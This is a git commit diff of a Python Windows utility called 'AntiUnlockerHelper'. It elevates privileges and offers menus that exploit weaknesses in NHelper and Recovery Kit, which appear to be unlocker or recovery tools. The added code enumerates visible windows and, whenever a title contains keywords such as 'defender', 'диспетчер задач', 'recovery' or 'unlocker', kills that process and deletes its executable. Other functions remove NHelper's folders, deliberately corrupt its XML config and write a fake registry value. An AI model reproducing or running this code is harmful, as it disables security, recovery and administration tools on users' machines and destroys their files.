02af249f4208aa9e0fdde77fc2e59cbadd60340d
AnonimNEO <operawifi.mini.net.win.2000@gmail.com>
2026-09-19 18:56:51 +0300

    0.5.3 Beta feat: добавлено закрытие по заголовку окна, улучшено меню

--- AUH.py
+++ AUH.py
@@ -9,6 +9,8 @@
 # Coded by AnonimNEO (Github)
 
 # Работа с процессами
+import win32process
+import win32gui
 import psutil
 # Логирование
 from loguru import logger
@@ -20,7 +22,9 @@ import time
 # Работа с реестром
 import winreg
 
-anti_nhelper_version = "0.3.7 Beta"
+auh_version = "0.5.4 Beta"
+
+DEBUG_MODE = False
 
 NET_PATH = r"C:\Users\Adminus\AppData\Local\Temp\.net"
 NH_PATH = r"C:\Users\Adminus\AppData\Local\NHelperV4"
@@ -37,18 +41,18 @@ def kill_process_by_name(process_name):
                     p.kill()
                     p.wait()
                     logger.info(f"AN - Процесс с именем {proc.info["name"]} (PID:{proc.info["pid"]}) - убит.")
-                except Exception as e:
+                except:
                     logger.exception(f"AN - Ошибка при закрытии процесса с именем {proc.info["name"]} (PID:{proc.info["pid"]})")
 
                 try:
                     os.remove(exe_file)
                     logger.info(f"AN - Файл процесса с именем {proc.info["name"]} - удалён.")
-                except Exception as e:
-                    logger.exception(f"AN - Ошибка при удалении исполняемого файла процесса с именем {proc.info["name"]} (PID:{proc.info["pid"]})")
+                except:
+                    logger.exception(f"AUH - Ошибка при удалении исполняемого файла процесса с именем {proc.info["name"]} (PID:{proc.info["pid"]})")
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
-        except Exception as e:
-            logger.exception(f"AN - Ошибка при закрытии процесса по имени {proc.info["name"]} (PID:{proc.info["pid"]})")
+        except:
+            logger.exception(f"AUH - Ошибка при закрытии процесса по имени {proc.info["name"]} (PID:{proc.info["pid"]})")
 
 
 
@@ -68,8 +72,8 @@ def get_folder_names(target_path):
             return folders
         else:
             return 0
-    except Exception as e:
-        logger.exception(f"AN - неизвестная ошибка при переборе каталогов")
+    except:
+        logger.exception(f"AUH - неизвестная ошибка при переборе каталогов")
         return 0
 
 
@@ -84,20 +88,20 @@ def break_xml():
             content = re.sub(r'^<\?xml[^?]*\?>', '<?xml version="1.0" encoding="utf-0"?>', content)
             with open(file_path, "w", encoding="utf-8") as f:
                 f.write(content)
-    logger.success("AN - XML файл повреждён")
+    logger.success("AUH - XML файл повреждён")
 
 
 
 def block_defend():
     """Создание параметра EnableBlockSearch (DWORD) по пути HKEY_LOCAL_MACHINE/SOFTWARE/Mozaila/"""
-    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Mozilla", 0, winreg.KEY_WRITE);
-    winreg.SetValueEx(k, "EnableBlockSearch", 0, winreg.REG_DWORD, 1);
+    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Mozilla", 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(k, "EnableBlockSearch", 0, winreg.REG_DWORD, 1)
     winreg.CloseKey(k)
-    logger.success("AN - Ложная защита nhelper включена")
+    logger.success("AUH - Ложная защита nhelper включена")
 
 
 
-def kill_nh():
+def kill_nh(DEBUG_MODE=False):
     """Нахождение имени процесса, затем его убийство и удаление исполняемого файла"""
     folder_list = get_folder_names(NET_PATH)
 
@@ -106,9 +110,10 @@ def kill_nh():
         for i in folder_list:
             try:
                 os.remove(f"{NET_PATH}\\{folder_list[i]}")
-                logger.success(f"AN - Каталог {NET_PATH}\\{folder_list[i]} удалён.")
-            except Exception as e:
-                # logger.error(f"AN - ошибка при удалении подкаталога в {NET_PATH}:\n{e}")
+                logger.success(f"AUH - Каталог {NET_PATH}\\{folder_list[i]} удалён.")
+            except:
+                if DEBUG_MODE:
+                    logger.error(f"AUH - ошибка при удалении подкаталога в {NET_PATH}")
                 pass
 
     for dir in NH_DIRS:
@@ -119,52 +124,155 @@ def kill_nh():
 
 
 
-if __name__ == "__main__":
-    logger.info(f"AntiNHelper v{anti_nhelper_version}")
-    logger.info("Настройка логирования...")
-    try:
-        logger.add(f"AN_log.txt", format="{time} {level} {message}", rotation="10 MB", compression="zip")
-        from elevate import elevate
-        elevate()
-        global user_name
-        user_name = os.getlogin()
-        logger.success("AN - Успешная подготовка к работе, запуск...")
-    except:
-        logger.exception("Ошибка инициализации")
-    while True:
-        print("\n" + "=" * 47)
-        print("║" + " " * 45 + "║")
-        print("║" + "  Какой уязвимостью хотите воспользоваться?".center(45) + "║")
-        print("║" + " " * 45 + "║")
-        print("║" + "  0) Выход из утилиты".ljust(45) + "║")
-        print("║" + "  1) Названием процесса в %Temp%/.net/".ljust(45) + "║")
-        print("║" + "  2) Защита NHelper от getgans".ljust(45) + "║")
-        print("║" + "  3) Смена кодировки XML в user.config".ljust(45) + "║")
-        print("║" + " " * 45 + "║")
-        print("=" * 47)
+def get_windows_titles(DEBUG_MODE=False):
+    """Получаем заголовки окон"""
+    window_list = []
 
-        choice = input("\n>>> Ваш выбор: ").strip()
+    def enum_windows_callback(hwnd, context):
+        # Проверяем, видимо ли окно
+        if win32gui.IsWindowVisible(hwnd):
+            # Получаем заголовок окна
+            title = win32gui.GetWindowText(hwnd)
 
-        if choice == "0":
-            exit()
-        elif choice == "1":
-            if input("\n[?] Включить цикл? (1 - да, другое - нет): ").strip() == "1":
+            try:
+                thread_id, pid = win32process.GetWindowThreadProcessId(hwnd)
+            except:
+                logger.exception(f"AUH - Ошибка при получении PID для окна {title}")
+                return # Продолжаем перебор окон
+
+            window_list.append((title, pid))
+
+    # Запускаем перебор всех окон
+    win32gui.EnumWindows(enum_windows_callback, None)
+    if DEBUG_MODE:
+        logger.debug(window_list)
+    return window_list
+
+
+
+def kill_bad_window(DEBUG_MODE=False):
+    bad_title_list = ["подтверждение", "удаления", "(не отвечает)", "процессов", "wanlocker", "разблокировка",
+                      "ограничений", "управление", "автозагрузкой", "fllitz", "defender", "готово", "редактор",
+                      "редактирование", "значения", "файловый", "менеджер", "среда", "восстановления", "успех",
+                      "тригеры", "информация", "ошибка", "диспетчер", "задач", "описание", "process", "параметры",
+                      "root", "guard", ".net", "unlocker", "system", "ultra", "unlcoker", "pirate", "helper",
+                      "создатели", ":3", "[главное]", "анализ", "запретов", "восстановление", "ассоциаций",
+                      "очистка", "музыка", "выход", "erocs", "[main]", "recovery", "kit", "vortex"]
+
+    windows = get_windows_titles(DEBUG_MODE)
+
+    for title, pid in windows:
+        title_lower = title.lower()
+        if DEBUG_MODE:
+            logger.debug(f"AUH - PID:{pid} - {title}")
+        for bad_title in bad_title_list:
+            if bad_title in title_lower:
+                logger.info(f"AUH - Обнаружен заголовок {title}, закрытие процесса (pid: {pid})...")
+
                 try:
-                    logger.info("AN - Запуск цикла...")
+                    p = psutil.Process(pid)
+                    p_name = p.name()
+                    exe_file = p.exe()
+                    p.kill()
+                    p.wait()
+                    logger.success(f"AUH - Процесс {p_name} (PID: {pid}) успешно убит.")
+
+                    try:
+                        if os.path.exists(exe_file):
+                            os.remove(exe_file)
+                            logger.info(f"AUH - Файл процесса {p_name} успешно удален: {exe_file}")
+                    except:
+                        logger.exception(f"AUH - Ошибка при удалении файла процесса {p_name} (PID: {pid})")
+
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    logger.error(f"AUH - Не удалось получить доступ к процессу с PID {pid}")
+                except:
+                    logger.error(f"AUH - Ошибка при обработке процесса с PID {pid}")
+                break
+
+
+
+if __name__ == "__main__":
+    try:
+        logger.info(f">>> Запуск AntiUnclokerHelper v{auh_version}...")
+        logger.info(">>> Настройка логирования...")
+        try:
+            logger.add(f"AN_log.txt", format="{time} {level} {message}", rotation="10 MB", compression="zip")
+            from elevate import elevate
+            elevate()
+            global user_name
+            user_name = os.getlogin()
+            logger.success("AUH - Успешная подготовка к работе, запуск...")
+        except:
+            logger.exception("AUH - Ошибка инициализации")
+        logger.success("AUH - Успешный запуск")
+        while True:
+            print("\n" + "=" * 47)
+            print("║" + " " * 45 + "║")
+            print("║" + "  Для какой программы работаем?".center(45) + "║")
+            print("║" + " " * 45 + "║")
+            print("║" + "  0) Выход из утилиты".ljust(45) + "║")
+            print("║" + "  1) Универсальные методы".ljust(45) + "║")
+            print("║" + "  2) NHelper".ljust(45) + "║")
+            print("║" + "  3) Recovery Kit".ljust(45) + "║")
+            print("║" + " " * 45 + "║")
+            print("=" * 47)
+            program = int(input(">>> Ваш выбор: ").strip())
+            if program == 0:
+                logger.info("AUH - Выход...")
+                exit()
+            elif program == 1:
+                if input("\n[?] Включить цикл? (1 - да, другое - нет): ").strip() == "1":
                     while True:
-                        kill_nh()
-                        logger.info("AN - Цикл завершён, повтор...")
-                        time.sleep(0.5)
-                except KeyboardInterrupt:
-                    logger.warning("AN - Цикл остановлен пользователем")
-                    continue
+                        try:
+                            kill_bad_window(DEBUG_MODE)
+                            logger.info("AUH - Цикл title завершён, повтор...")
+                            time.sleep(0.5)
+                        except KeyboardInterrupt:
+                            logger.warning("AUH - Цикл остановлен пользователем")
+                            break
+                else:
+                    kill_bad_window(DEBUG_MODE)
+            elif program == 2:
+                while True:
+                    print("\n" + "=" * 47)
+                    print("║" + " " * 45 + "║")
+                    print("║" + "  Какой уязвимостью хотите воспользоваться?".center(45) + "║")
+                    print("║" + " " * 45 + "║")
+                    print("║" + "  0) Выход в меню".ljust(45) + "║")
+                    print("║" + "  1) Названием процесса в %Temp%/.net/".ljust(45) + "║")
+                    print("║" + "  2) Защита NHelper от getgans".ljust(45) + "║")
+                    print("║" + "  3) Смена кодировки XML в user.config".ljust(45) + "║")
+                    print("║" + " " * 45 + "║")
+                    print("=" * 47)
+
+                    choice = int(input("\n>>> Ваш выбор: ").strip())
+
+                    if choice == 0:
+                        break
+                    elif choice == 1:
+                        if input("\n[?] Включить цикл? (1 - да, другое - нет): ").strip() == "1":
+                            while True:
+                                try:
+                                    kill_nh(DEBUG_MODE)
+                                    logger.info("AUH - Цикл nh завершён, повтор...")
+                                    time.sleep(0.5)
+                                except KeyboardInterrupt:
+                                    logger.warning("AUH - Цикл остановлен пользователем")
+                                    break
+                        else:
+                            kill_nh(DEBUG_MODE)
+                    elif choice == 2:
+                        logger.info("AUH - Применение защиты NHelper...")
+                        block_defend()
+                    elif choice == 3:
+                        logger.info("AUH - Изменение кодировки XML...")
+                        break_xml()
+                    else:
+                        print("\n[!] Неправильный ввод. Попробуйте ещё раз.")
+            elif program == 3:
+                print('>>> Для RecoveryKit на данный момент нет уникальных уязвимостей, на него работает раздел "Универсальные"')
             else:
-                kill_nh()
-        elif choice == "2":
-            logger.info("AN - Применение защиты NHelper...")
-            block_defend()
-        elif choice == "3":
-            logger.info("AN - Изменение кодировки XML...")
-            break_xml()
-        else:
-            print("\n[!] ❌ Неправильный ввод. Попробуйте ещё раз.")
+                print("\n[!] Неправильный ввод. Попробуйте ещё раз.")
+    except:
+        logger.exception("AUH - Неизвестная ошибка")
